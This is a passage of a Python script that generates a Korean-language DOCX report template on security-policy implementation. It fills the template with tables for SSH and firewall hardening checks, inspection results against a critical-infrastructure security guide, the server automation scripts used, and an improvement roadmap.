        column_width_mm=[40, 130],
    )

    _add_table(
        document,
        "표 5-14. 정책 검증 체크리스트(편집용)",
        [
            ["점검 항목", "명령/방법", "기대 결과", "결과", "증빙 ID"],
            ["SSHD 설정 반영", "sshd -T | egrep 'permitrootlogin|passwordauthentication'", "no / no", "(기입)", "TERM-5-06"],
            ["UFW 규칙 적용", "ufw status verbose", "22/tcp 제한 규칙 확인", "(기입)", "TERM-5-07"],
            ["iptables 규칙 적용", "iptables -S | egrep 'recent|dport 22'", "recent 규칙 존재", "(기입)", "TERM-5-08"],
            ["DNS TCP 53 차단", "ss -lntup | grep ':53' + 방화벽 규칙 확인", "정책 의도대로 제한", "(기입)", "TERM-5-09"],
            ["웹 접근 통제(선택)", "curl/브라우저 접근 테스트", "비허용 대역 차단", "(기입)", "TERM-5-10"],
        ],
        column_width_mm=[48, 50, 36, 16, 20],
    )

    _add_figure_placeholder(
        document,
        "그림 5-8. 보안 정책 적용 전/후 검증 캡처(증빙)",
        "IMG-5-08",
        "점검 체크리스트 결과(터미널/로그/관제 화면) 캡처를 항목별로 삽입",
    )

    document.add_page_break()

    h54 = document.add_paragraph("5.4 주정통 기반 보안점검 결과")
    h54.style = document.styles["Heading 2"]
    _set_paragraph_font(h54, "맑은 고딕")

    p = document.add_paragraph(
        "주정통(주요정보통신기반시설) 기술적 점검 가이드 기반으로 선별한 점검 항목을 대상으로 "
        "자동화 점검(스크립트)과 수동 점검(로그/설정 확인)을 병행하여 결과를 정리하였다. "
        "점검 항목/코드 체계는 프로젝트에서 선정한 기준에 맞춰 수정 가능하도록 표 형태로 구성하였다."
    )
    _set_paragraph_font(p, "맑은 고딕")

    _add_table(
        document,
        "표 5-15. 주정통 기반 점검 수행 절차(요약)",
        [
            ["단계", "내용", "산출물"],
            ["1", "점검 대상 서버 목록(DB) 등록", "자산 목록"],
            ["2", "점검 항목(선정) 정의 및 자동화/수동 분류", "점검 항목표"],
            ["3", "SSH 기반 점검 명령 수행 및 결과 파싱/저장", "점검 결과(DB/리포트)"],
            ["4", "결과 가시화(웹 페이지/대시보드)", "대시보드 캡처"],
            ["5", "미흡 항목 조치 후 재점검", "조치 내역 및 재점검 결과"],
        ],
        column_width_mm=[12, 108, 50],
    )

    _add_table(
        document,
        "표 5-16. 자동화 스크립트/함수(요약, 참고: 기획안 주정통 코드 부분)",
        [
            ["NO", "스크립트/함수", "대상 서버/OS", "주요 기능", "입력 예시", "출력/결과"],
            ["1", "init_ssh + menu", "Ubuntu/Rocky9(Core)", "DHCP/Apache/VHost/PHP/phpMyAdmin/FTP/MariaDB 설치 선택", "IP:172.16.16.1, [1-3]", "서비스 활성 + index.html"],
            ["2", "apa_in(), apa_ch_dir_in()", "Rocky9(Web EN/KR)", "Apache + VirtualHost(team1.com) + DocRoot 변경", "/home/team1", "httpd.conf 수정 + 재시작"],
            ["3", "smb_install(), go()", "Rocky9(Storage)", "Samba 설치/공유 + user 생성", "PW: (마스킹)", "smbd/nmbd active"],
            ["4", "install_and_configure(), main()", "Ubuntu(MB)", "TigerVNC + GNOME + xstartup", "PW: (마스킹), :5901", "vncserver@:1 active"],
            ["5", "nfs_install(), main()", "Rocky9(Storage)", "NFS utils + 공유 + 마운트", "NFS IP:172.16.16.100", "exportfs -v 확인"],
            ["6", "download(), main()", "Rocky9(MB-Monitorix)", "Monitorix 설치/재시작", "-", "systemctl status monitorix"],
            ["7", "install_gnome(), main()", "Rocky9(MB)", "XRDP + GNOME + user 생성", "user:team1, PW: (마스킹)", "xrdp active(3389)"],
            ["8", "install(), mod_zone()", "Rocky9(DNS)", "BIND + zone + 동적 A 레코드 편집", "dns_data.txt", "nslookup 성공"],
            ["9", "format_partition(), main()", "Ubuntu(ST-R5/10)", "Partition/FMT/ext4 + fstab + Disk Quota", "/dev/sda1, /jupyter", "repquota 제한 확인"],
            ["10", "cc(cmd)", "모든 서버", "SSH 명령 실행 + 출력 파싱/오류 처리", "임의 cmd", "stdout/stderr 실시간 출력"],
        ],
        column_width_mm=[10, 34, 30, 52, 22, 22],
    )

    _add_table(
        document,
        "표 5-17. 주정통 기반 보안점검 결과(요약, 편집용)",
        [
            ["점검 영역", "점검 항목(기준)", "점검 방법", "대상", "결과", "조치/비고", "증빙 ID"],
            ["접근통제", "root 원격 로그인 금지", "수동/자동", "SSH 대상 서버", "(기입)", "PermitRootLogin no", "TERM-5-06"],
            ["접근통제", "SSH 패스워드 로그인 금지", "수동/자동", "SSH 대상 서버", "(기입)", "PasswordAuthentication no", "TERM-5-06"],
            ["네트워크", "관리망만 SSH 허용", "수동", "SSH 대상 서버", "(기입)", "UFW allow/deny 규칙", "TERM-5-07"],
            ["네트워크", "브루트포스/스캔 차단", "수동", "SSH 대상 서버", "(기입)", "iptables recent 규칙", "TERM-5-08"],
            ["DNS", "AXFR 제한", "수동", "DNS 서버", "(기입)", "TCP 53 제한 + Secondary DNS 허용", "LOG-5-02"],
            ["웹", "정찰 차단(내부 전용 시)", "선택", "웹 서버", "(기입)", "80/443 접근대역 제한", "TERM-5-10"],
            ["애플리케이션", "SQLi 방어", "수동", "웹 서버", "(기입)", "WAF/코드 보완 필요", "LOG-5-03"],
            ["관제", "필수 로그 수집/제출 기준", "운영", "전 서버", "완료", "표준 제출 항목 정의", "표 5-9"],
            ["-", "(추가 기입)", "(기입)", "(기입)", "(기입)", "(기입)", "(기입)"],
        ],
        column_width_mm=[20, 42, 20, 20, 12, 38, 18],
    )

    _add_table(
        document,
        "표 5-18. 보완 필요 항목 및 개선 로드맵(예시)",
        [
            ["구분", "항목", "현황", "개선 방향", "우선순위"],
            ["웹", "SQLi/Command Injection 근본 방어", "L3/L4 차단 한계", "WAF 도입 및 취약 기능 제거/패치", "상"],
            ["관제", "Snort 룰 튜닝 및 오탐 관리", "(기입)", "시나리오별 룰 검증 및 상시 정책 반영", "중"],
            ["운영", "로그 중앙수집/보관", "(기입)", "Syslog/ELK 등 중앙 수집 및 보관 주기 정의", "중"],
            ["가용성", "DoS 완화", "기본 SYN cookies 의존", "레이트리밋/상위 장비 ACL/캐시 적용", "중"],
        ],
        column_width_mm=[18, 52, 40, 46, 14],
    )

    _add_figure_placeholder(
        document,
        "그림 5-9. 주정통 점검 결과 대시보드(증빙)",
        "IMG-5-09",
        "점검 결과를 DB 저장 및 웹 가시화한 화면(리스트/상세/필터/엑셀 출력 등) 캡처 삽입",
    )

    document.save(output_path)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="보안정책 구현 결과보고서(DOCX) 템플릿 생성기")
    parser.add_argument(
        "--out",
        default="보안정책_구현_결과보고서_템플릿.docx",
        help="출력 DOCX 경로(기본: 보안정책_구현_결과보고서_템플릿.docx)",
    )
    args = parser.parse_args()
    build_report(str(args.out))
